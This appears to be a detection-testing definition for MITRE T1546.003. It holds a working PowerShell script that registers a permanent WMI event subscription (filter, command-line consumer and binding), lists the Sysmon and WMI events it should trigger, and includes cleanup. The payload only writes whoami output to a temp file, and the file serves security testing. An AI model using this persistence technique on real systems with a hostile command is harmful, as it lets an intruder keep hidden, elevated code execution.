id: T1546.003
name: WMI Event Subscription Persistence
description: Creates a complete WMI permanent subscription using New-CimInstance (modern attacker tooling) — all three required components: EventFilter, CommandLineEventConsumer, and FilterToConsumerBinding. Generates Sysmon EID 19/20/21 (all three WMI events must fire for full detection signature) and WMI Operational EID 5861. Exabeam has 6 dedicated rules.
tactic: persistence
technique_id: T1546.003
platform: windows
phase: attack
elevation_required: true
expected_events:
  - "Sysmon 19 (WmiEventFilter — filter name and WQL query logged)"
  - "Sysmon 20 (WmiEventConsumer — consumer type CommandLineEventConsumer + command)"
  - "Sysmon 21 (WmiEventConsumerToFilter — binding links filter to consumer)"
  - "WMI-Activity/Operational EID 5861 (permanent subscription registered)"
tags:
  - persistence
  - requires-elevation
executor:
  type: powershell
  command: |-
    Write-Host "[T1546.003] WMI Event Subscription — EventFilter + Consumer + Binding"

    $filterName   = "LNJFilter"
    $consumerName = "LNJConsumer"

    # Step 1: EventFilter — what triggers the subscription
    # WQL query fires on system uptime (non-destructive trigger)
    Write-Host "--- Step 1: __EventFilter creation (Sysmon EID 19) ---"
    $filterArgs = @{
        Name           = $filterName
        EventNamespace = "root\CIMv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    }
    $filter = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property $filterArgs
    Write-Host "EventFilter created: $filterName — Sysmon EID 19 fired"

    # Step 2: CommandLineEventConsumer — what action to execute
    Write-Host "--- Step 2: CommandLineEventConsumer creation (Sysmon EID 20) ---"
    $consumerArgs = @{
        Name                = $consumerName
        ExecutablePath      = "$env:SystemRoot\System32\cmd.exe"
        CommandLineTemplate = "cmd.exe /c whoami > `"$env:TEMP\lnj_wmi_persist.txt`""
    }
    $consumer = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property $consumerArgs
    Write-Host "CommandLineEventConsumer created: $consumerName — Sysmon EID 20 fired"

    # Step 3: FilterToConsumerBinding — links filter to consumer (completes the subscription)
    Write-Host "--- Step 3: FilterToConsumerBinding (Sysmon EID 21 + WMI-Activity EID 5861) ---"
    $bindingArgs = @{ Filter = [ref]$filter; Consumer = [ref]$consumer }
    New-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -Property $bindingArgs | Out-Null
    Write-Host "Binding created — Sysmon EID 21 fired; WMI Operational EID 5861 fired"

    # Verify subscription was created
    Write-Host "--- Verification: subscriptions in root/subscription ---"
    Get-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" | Where-Object Name -eq $filterName | Select-Object Name, Query | Format-Table
    Get-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" | Where-Object Name -eq $consumerName | Select-Object Name, CommandLineTemplate | Format-Table

    Write-Host "[T1546.003] Complete. Sysmon EID 19+20+21 all fired. WMI Operational EID 5861 registered."
cleanup: |-
  Get-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -ErrorAction Ignore |
      Where-Object { $_.Filter.Name -eq "LNJFilter" } | Remove-CimInstance
  Get-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Filter "Name='LNJConsumer'" -ErrorAction Ignore | Remove-CimInstance
  Get-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Filter "Name='LNJFilter'" -ErrorAction Ignore | Remove-CimInstance
  Remove-Item "$env:TEMP\lnj_wmi_persist.txt" -ErrorAction Ignore
  Write-Host "Cleanup: WMI subscription (filter+consumer+binding) removed."
